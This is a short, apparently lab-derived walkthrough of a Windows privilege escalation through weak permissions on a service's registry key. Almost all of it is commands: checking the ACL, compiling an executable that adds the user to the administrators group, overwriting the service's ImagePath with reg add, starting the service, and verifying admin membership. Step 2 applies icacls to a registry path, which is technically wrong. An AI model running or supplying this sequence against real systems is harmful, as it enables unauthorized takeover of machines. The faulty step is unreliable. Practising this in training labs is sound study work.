
1. **Query Registry Permissions:**
   ```plaintext
   Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
   ```
   - Confirms "NT AUTHORITY\INTERACTIVE" has FullControl over the registry key.

2. **Check Registry Permissions Using icacls:**
   ```plaintext
   icacls "hklm:\System\CurrentControlSet\services\regsvc"
   ```
   - The output should show that "NT AUTHORITY\INTERACTIVE" or "BUILTIN\Users" has "F" (Full Control) or "M" (Modify) permissions for the service to be vulnerable.

3. **Compile and Deploy Executable:**
   ```plaintext
   x86_64-w64-mingw32-gcc windows_service.c -o x.exe
   ```
   - Creates an executable that adds the user to the local administrators group.

4. **Overwrite ImagePath:**
   ```plaintext
   reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
   ```

5. **Exploit:**
   - Start the service:
     ```plaintext
     sc start regsvc
     ```

6. **Verify:**
   ```plaintext
   net localgroup administrators
   ```
   - Confirms the user was added to the local administrators group.
